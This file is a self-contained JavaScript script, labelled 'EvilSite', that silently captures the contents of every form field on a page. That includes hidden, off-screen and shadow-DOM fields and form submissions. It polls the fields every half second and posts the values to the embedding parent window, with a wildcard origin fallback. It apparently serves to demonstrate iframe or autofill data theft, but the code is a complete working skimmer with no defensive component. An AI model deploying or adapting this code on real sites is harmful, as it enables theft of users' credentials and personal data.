(function () {
  const wiredFields = new WeakSet();
  const lastValues = new WeakMap();

  function parentOrigin() {
    try {
      if (document.referrer) return new URL(document.referrer).origin || "*";
    } catch (err) {}
    return "*";
  }

  function post(event, payload) {
    window.parent.postMessage({
      source: "EvilSite",
      event,
      payload,
      path: location.pathname,
      origin: location.origin,
      ts: Date.now()
    }, parentOrigin());
  }

  function localLog(message, tag = "INFO") {
    const logEl = document.getElementById("localLog");
    if (!logEl) return;
    const line = document.createElement("div");
    line.className = "log-line";
    line.textContent = `[${new Date().toLocaleTimeString()}] ${tag}: ${message}`;
    logEl.appendChild(line);
    logEl.scrollTop = logEl.scrollHeight;
  }

  function safeStringify(value) {
    try {
      return JSON.stringify(value, null, 2);
    } catch (err) {
      return String(value);
    }
  }

  function fieldKey(el) {
    return el.name || el.id || el.getAttribute("autocomplete") || el.type || "field";
  }

  function fieldMeta(el) {
    const rect = el.getBoundingClientRect();
    const style = getComputedStyle(el);
    return {
      id: el.id || null,
      name: el.name || null,
      type: el.type || null,
      autocomplete: el.getAttribute("autocomplete"),
      value: el.value || "",
      display: style.display,
      visibility: style.visibility,
      opacity: style.opacity,
      disabled: el.disabled,
      readOnly: el.readOnly,
      rect: {
        x: Math.round(rect.x),
        y: Math.round(rect.y),
        width: Math.round(rect.width),
        height: Math.round(rect.height)
      },
      inViewport: rect.bottom > 0 && rect.right > 0 && rect.top < innerHeight && rect.left < innerWidth,
      active: document.activeElement === el
    };
  }

  function findFields(root = document) {
    const fields = Array.from(root.querySelectorAll("input, textarea, select, [contenteditable=true]"));
    if (root === document) {
      document.querySelectorAll("*").forEach((node) => {
        if (node.shadowRoot) fields.push(...findFields(node.shadowRoot));
      });
    }
    return fields;
  }

  function wireEvents(el) {
    if (wiredFields.has(el)) return;
    wiredFields.add(el);
    ["focus", "blur", "input", "change"].forEach((eventName) => {
      el.addEventListener(eventName, () => {
        const payload = fieldMeta(el);
        post("FIELD_CHANGED", { event: eventName, field: payload });
        localLog(`${eventName}: ${fieldKey(el)} = "${el.value || ""}"`, "FIELD");
      });
    });
  }

  function wireAllFields() {
    findFields().forEach(wireEvents);
  }

  function snapshotAndReport(reason = "poll") {
    wireAllFields();
    const fields = findFields();
    const data = {};
    const fieldsMeta = fields.map((el) => {
      const meta = fieldMeta(el);
      data[fieldKey(el)] = meta.value;
      const prev = lastValues.get(el);
      meta.changed = prev !== meta.value;
      lastValues.set(el, meta.value);
      return meta;
    });

    const anyChange = fieldsMeta.some((item) => item.changed);
    if (anyChange || reason !== "poll") {
      post("FORM_SNAPSHOT", {
        reason,
        data,
        fields: fieldsMeta,
        activeElement: document.activeElement ? fieldKey(document.activeElement) : null
      });
      localLog(`${reason}: ${safeStringify(data)}`, "SNAPSHOT");
    }
  }

  function ready() {
    wireAllFields();
    post("EVIL_READY", {
      title: document.title,
      origin: location.origin,
      path: location.pathname,
      fieldCount: findFields().length
    });
    snapshotAndReport("ready");
  }

  function init(options = {}) {
    if (document.readyState === "complete" || document.readyState === "interactive") {
      setTimeout(ready, 0);
    } else {
      window.addEventListener("DOMContentLoaded", ready);
    }

    window.addEventListener("message", (ev) => {
      if (!ev || !ev.data) return;
      if (ev.data.type === "PING_PARENT") {
        post("PONG_IFRAME", { receivedTs: Date.now() });
      } else if (ev.data.type === "REQUEST_SNAPSHOT") {
        snapshotAndReport("manual-request");
      }
    });

    Array.from(document.forms).forEach((form) => {
      form.addEventListener("submit", () => {
        const payload = {};
        Array.from(new FormData(form).entries()).forEach(([key, value]) => {
          payload[key] = value;
        });
        post("FORM_SUBMIT", { formId: form.id || null, payload });
      }, { capture: true });
    });

    setInterval(() => snapshotAndReport("poll"), options.pollMs || 500);
    setTimeout(() => snapshotAndReport("initial-delay"), 200);
  }

  window.EvilSite = {
    init,
    post,
    localLog,
    snapshotAndReport,
    wireAllFields,
    fieldMeta,
    safeStringify
  };
})();
